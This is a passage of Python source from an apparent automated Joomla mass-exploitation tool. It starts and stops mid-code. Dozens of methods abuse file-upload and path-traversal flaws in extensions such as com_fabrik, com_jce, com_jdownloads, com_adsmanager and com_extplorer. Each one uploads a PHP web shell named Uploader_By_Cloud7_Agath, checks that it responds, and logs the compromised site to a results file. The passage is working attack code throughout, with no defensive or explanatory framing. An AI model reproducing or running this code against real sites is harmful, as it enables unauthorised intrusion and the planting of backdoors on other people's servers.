			c = (url+'/media/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, data=pay, files=pay2)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Fabrik{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Fabrik{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def fabrikjoom2(self, url):
		try:
			asd = requests.get(url+'/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload')
			if '"filepath:"' in asd.content:
				data = {'file:': (shellname, shell, 'text/html')}
				p = (url+'/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload')
				c = (url+'/'+shellname)
				asd = requests.post(p, headers=headers, files=data)
				get = requests.get(c, headers=headers, timeout=9)
				if 'Uploader_By_Cloud7_Agath_' in get.content:
					print('[Joomla] {}{}{} ||{}Com_Fabrik 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
					open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
				else:
					print('[Joomla] {}{}{} ||{}Com_Fabrik 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def jcejoom(self, url):
		try:
			pay = {'upload-dir': '../../',
					'upload-overwrite': '0',
					'action': 'upload'}
			pay2 = {'Filedata':open (php, 'rb')}
			p = (url+'/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form"')
			c = (url+'/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, data=pay, files=pay2)
			get = requests.get(c, header=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_JCE{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_JCE{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def jdownloadjoom(self, url):
		try:

			data = {'name': 'yc-waif', 'mail': 'buatnuyulea@gmail.com', 'catlist': '1', 'filetitle': "lolz", 'description': "<p>zot</p>" , '2d1a8f3bd0b5cf542e9312d74fc9766f': 1, 'send': 1, 'senden': "Send file", 'description': "<p>newsking</p>", 'option': "com_jdownloads", 'view': "upload"}
			file = {'file_upload':(php3, shell, 'text/html'), 'pic_upload':(php3, shell, 'text/html')}
			p = (url+'/index.php?option=com_jdownloads&Itemid=0&view=upload')
			c = (url+'/images/jdownloads/screenshots/Uploader_By_Cloud7_Agath.php3.g')
			asd = requests.post(p, headers=headers, data=data, files=file)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_JDownloads{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_JDownloads{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			pass

	def jdownloadjoom2(self, url):
		try:

			data = {'name': 'yc-waif', 'mail': 'buatnuyulea@gmail.com', 'catlist': '1', 'filetitle': "lolz", 'description': "<p>zot</p>" , '2d1a8f3bd0b5cf542e9312d74fc9766f': 1, 'send': 1, 'senden': "Send file", 'description': "<p>newsking</p>", 'option': "com_jdownloads", 'view': "upload"}
			file = {'file_upload':(phpj, shell, 'text/html'), 'pic_upload':(phpj, shell, 'text/html')}
			p = (url+'/index.php?option=com_jdownloads&Itemid=0&view=upload')
			c = (url+'/images/jdownloads/screenshots/Uploader_By_Cloud7_Agath.php.j')
			asd = requests.post(p, headers=headers, data=data, files=file)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_JDownloads 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_JDownloads 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def oziogalljoom(self, url):
		try:
			data = {'path':'/../../../'}
			shellaaa = {'raw_data':(php, shell, 'text/html')}
			p = (url+'/components/com_oziogallery/imagin/scripts_ralcr/filesystem/writeToFile.php')
			c = (url+'/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=shellaaa, data=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Oziogallery{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Oziogallery{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			pass

	def oziogalljoom2(self, url):
		try:
			data = {'path':'/../../../'}
			file = {'raw_data':(php, shell, 'text/html')}
			p = (url+'/components/com_oziogallery2/imagin/scripts_ralcr/filesystem/writeToFile.php')
			c = (url+'/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=file, data=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Oziogallery 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Oziogallery 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			pass

	def oziogalljoom3(self, url):
		try:
			data = {'path': '/../../../'}
			file = {'raw_data':open(php, 'rb')}
			p = (url+'/components/com_oziogallery2/imagin/scripts_ralcr/filesystem/writeToFile.php')
			c = (url+'/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=file, data=data)
			get = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Oziogallery 3{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Oziogallery 3{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def jbcatjoom(self, url):
		try:
			data = {'files[]':(shellname, shell, 'text/html')}
			p = (url+'/components/com_jbcatalog/libraries/jsupload/server/php/')
			c = (url+'/com_jbcatalog/libraries/jsupload/server/php/files/'+shellname)
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Jbcatalog{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Jbcatalog{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def jbcatjoom2(self, url):

		try:

			data = {'files[]':open (php, 'rb')}
			p = (url+'/components/com_jbcatalog/libraries/jsupload/server/php/')
			c = (url+'/com_jbcatalog/libraries/jsupload/server/php/files/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Jbcatalog 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Jbcatalog 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def jbcatjoom3(self, url):

		try:
			data = {'files[]':(phpj, shell, 'text/html')}
			p = (url+'/components/com_jbcatalog/libraries/jsupload/')
			c = (url+'/com_jbcatalog/libraries/jsupload/server/php/files/Uploader_By_Cloud7_Agath.php.j')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Jbcatalog 3{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Jbcatalog 3{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def jbcatjoom4(self, url):

		try:

			data = {'files[]':(shellname, shell, 'text/html')}
			p = (url+'/components/com_jbcatalog/libraries/jsupload/')
			c = (url+'/com_jbcatalog/libraries/jsupload/server/php/files/'+shellname)
			asd = requests.post(p, headers=headers, files=data)
			get = requests.post(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Jbcatalog 4{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Jbcatalog 4{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def modsocjoom(self, url):

		try:

			data = {'uploadfile':open (php, 'rb')}
			p = (url+'/modules/mod_socialpinboard_menu/saveimagefromupload.php')
			c = (url+'/modules/mod_socialpinboard_menu/images/socialpinboard/temp/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Mod_Socialpinboard_Menu{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Mod_Socialpinboard_Menu{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def modsocjoom2(self, url):

		try:

			data = {'uploadfile':open (phtml, 'rb')}
			p = (url+'/modules/mod_socialpinboard_menu/saveimagefromupload.php')
			c = (url+'/modules/mod_socialpinboard_menu/images/socialpinboard/temp/Uploader_By_Cloud7_Agath.phtml')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Mod_Socialpinboard_Menu 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Mod_Socialpinboard_Menu 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def adsmjoom(self, url):

		try:

			data = {'name': 'Files/Uploader_By_Cloud7_Agath.jpg'}
			pay = {'file':(jpg, shell, 'text/html')}
			p = (url+'/index.php?option=com_adsmanager&task=upload&tmpl=component')
			c = (url+'/tmp/plupload/Uploader_By_Cloud7_Agath.jpg')
			asd = requests.post(p, headers=headers, data=data, files=pay)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Adsmanager{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Adsmanager{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def adsmjoom2(self, url):

		try:

			file = {'file':(php, shell, 'text/html'), 'name':shellname}
			p = (url+'/index.php?option=com_adsmanager&task=upload&tmpl=component')
			c = (url+'/tmp/plupload/'+shellname)
			asd = requests.post(p, headers=headers, files=file)
			get = requests.post(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Adsmanager 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Adsmanager 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def adsmjoom3(self, url):

		try:

			data = {'name': 'Files/Uploader_By_Cloud7_Agath.php.jpg'}
			file = {'file':(jpg, shell, 'text/html')}
			p = (url+'/index.php?option=com_adsmanager&task=upload&tmpl=component')
			c = (url+'/tmp/plupload/Uploader_By_Cloud7_Agath.php.jpg')
			asd = requests.post(p, headers=headers, data=data, files=file)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Adsmanager 3{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Adsmanager 3{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def adsmjoom4(self, url):

		try:

			data = {'name': 'Files/Uploader_By_Cloud7_Agath.php'}
			file = {'file':(php, shell, 'text/html')}
			p = (url+'/index.php?option=com_adsmanager&task=upload&tmpl=component')
			c = (url+'/tmp/plupload/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, data=data, files=file)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Adsmanager 4{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Adsmanager 4{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def sexyjoom(self, url):

		try:

			data = {'files[]':open (php, 'rb')}
			p = (url+'/com_sexycontactform/fileupload/index.php')
			c = (url+'/com_sexycontactform/fileupload/files/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Sexycontactform{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Sexycontactform{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def sexyjoom2(self, url):

		try:

			data = {'files[]':open (phtml, 'rb')}
			p = (url+'/com_sexycontactform/fileupload/index.php')
			c = (url+'/com_sexycontactform/fileupload/files/Uploader_By_Cloud7_Agath.phtml')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Sexycontactform 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Sexycontactform 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def sexyjoom3(self, url):

		try:

			data = {'uploadfile':open (php, 'rb')}
			p = (url+'/com_sexycontactform/fileupload/index.php')
			c = (url+'/com_sexycontactform/fileupload/files/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Sexycontactform 3{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Sexycontactform 3{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def myblogjoom(self, url):

		try:

			data = {'fileToUpload':(xxxjpg, shell, 'text/html')}
			p = (url+'/index.php?option=com_myblog&task=ajaxupload')
			c = (url+'/Uploader_By_Cloud7_Agath.php.xxxjpg')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Myblog{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Myblog{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def rockjoom(self, url):

		try:

			pay = {'Filedata':(xxxjpg, shell, 'rb')}
			data = {'jpath':'..%2F..%2F..%2F..%2F'}
			p = (url+'/administrator/components/com_rokdownloads/assets/uploadhandler.php')
			c = (url+'/images/stories/Uploader_By_Cloud7_Agath.php.xxxjpg')
			asd = requests.post(p, headers=headers, data=data, files=pay)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Rokdownloads{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Rokdownloads{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def rockjoom3(self, url):

		try:

			data = {'jpath': '../../../../'}
			pay = {'files[]':open (php, 'rb')}
			p = (url+'/administrator/components/com_rokdownloads/assets/uploadhandler.php')
			c = (url+'/images/stories/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, data=data, files=payload, timeout=10)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Rokdownloads 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Rokdownloads 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def simphojoom(self, url):


		try:

			data = {'jpath':'..%2F..%2F..%2F..%2F'}
			pay = {'file':(xxxjpg, shell, 'text/html')}
			p = (url+'/administrator/components/com_simplephotogallery/lib/uploadFile.php')
			c = (url+'/Uploader_By_Cloud7_Agath.php.xxxjpg')
			asd = requests.post(p, headers=headers, data=data, files=pay)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Simplephotogallery{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Simplephotogallery{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def simphojoom2(self, url):

		try:

			data = {'jpath':'../../../'}
			pay = {'file':open(xxxjpg, 'rb')}
			p = (url+'/administrator/components/com_simplephotogallery/lib/uploadFile.php')
			c = (url+'/Uploader_By_Cloud7_Agath.php.xxxjpg')
			asd = requests.post(p, headers=headers, data=data, files=pay)
			get = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Simplephotogallery 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Simplephotogallery 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def extplojoom(self, url):

		try:

			data = {'Filedata':(xxxjpg, shell, 'text/html')}
			p = (url+'/administrator/components/com_extplorer/uploadhandler.php')
			c = (url+'/images/stories/Uploader_By_Cloud7_Agath.php.xxxjpg')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Extplorer{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Extplorer{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			pass


	def extplojoom2(self, url):

		try:

			data = {'Filedata':(php, shell, 'text/html')}
			p = (url+'/administrator/components/com_extplorer/uploadhandler.php')
			c = (url+'/images/stories/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Extplorer 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Extplorer 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def megajoom(self, url):

		try:

			data = {'Filedata':open (phtml, 'rb')}
			p = (url+'/modules/megamenu/uploadify/uploadify.php?folder=modules/megamenu/uploadify/')
			c = (url+'/modules/megamenu/uploadify/Uploader_By_Cloud7_Agath.phtml')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Megamenu{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Megamenu{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def megajoom2(self, url):

		try:

			data = {'Filedata':open (php, 'rb')}
			p = (url+'/modules/megamenu/uploadify/uploadify.php?folder=modules/megamenu/uploadify/')
			c = (url+'/modules/megamenu/uploadify/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Megamenu 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Megamenu 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def btportjoom(self, url):

		try:

			data = {'Filedata':open (php, 'rb')}
			p = (url+'/administrator/components/com_bt_portfolio/helpers/uploadify/uploadify.php')
			c = (url+'/administrator/components/com_bt_portfolio/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Bt_Portfolio{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Bt_Portfolio{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def btportjoom2(self, url):

		try:

			data = {'Filedata':open (phtml, 'rb')}
			p = (url+'/administrator/components/com_bt_portfolio/helpers/uploadify/uploadify.php')
			c = (url+'/administrator/components/com_bt_portfolio/Uploader_By_Cloud7_Agath.phtml')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Bt_Portfolio 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Bt_Portfolio 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def jwalljoom(self, url):

		try:

			data = {'file':open (php, 'rb')}
			p = (url+'/index.php?option=com_jwallpapers&task=upload')
			c = (url+'/jwallpapers_files/plupload/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Jwallpapers{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Jwallpapers{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def jwalljoom2(self, url):

		try:

			data = {'file':open (phtml, 'rb')}
			p = (url+'/index.php?option=com_jwallpapers&task=upload')
			c = (url+'/jwallpapers_files/plupload/Uploader_By_Cloud7_Agath.phtml')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Jwallpapers 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Jwallpapers 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def jwalljoom3(self, url):

		try:

			data = {'file':open (phpjpg, 'rb')}
			p = (url+'/index.php?option=com_jwallpapers&task=upload')
			c = (url+'/jwallpapers_files/plupload/Uploader_By_Cloud7_Agath.php.jpg')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Jwallpapers 3{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Jwallpapers 3{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def redmyjoom(self, url):

		try:

			pay = {'folder':'/components/com_facileforms/libraries/jquery/'}
			pay2 = {'Filedata':open (php, 'rb')}
			p = (url+'/components/com_facileforms/libraries/jquery/uploadify.php')
			c = (url+'/components/com_facileforms/libraries/jquery/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, data=pay, files=pay2)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Facileforms{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Facileforms{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def redmyjoom2(self, url):

		try:

			pay = {'folder':'/components/com_facileforms/libraries/jquery/'}
			pay2 = {'Filedata':open (phtml, 'rb')}
			p = (url+'/components/com_facileforms/libraries/jquery/uploadify.php')
			c = (url+'/components/com_facileforms/libraries/jquery/Uploader_By_Cloud7_Agath.phtml')
			asd = requests.post(p, headers=headers, data=pay, files=pay2)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Facileforms 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Facileforms 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def redmyjoom3(self, url):

		try:

			pay = {'folder':'/components/com_facileforms/libraries/jquery/'}
			pay2 = {'Filedata':open (phpjpg, 'rb')}
			p = (url+'/components/com_facileforms/libraries/jquery/uploadify.php')
			c = (url+'/components/com_facileforms/libraries/jquery/Uploader_By_Cloud7_Agath.php.jpg')
			asd = requests.post(p, headers=headers, data=pay, files=pay2)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Facileforms 3{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Facileforms 3{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass



	def facilejoom(self, url):

		try:
			p = (url+'/administrator/components/com_redmystic/chart/ofc-library/ofc_upload_image.php?name=Uploader_By_Cloud7_Agath.php')
			c = (url+'/administrator/components/com_redmystic/chart/tmp-upload-images/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=shell)
			gg = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in gg.content:
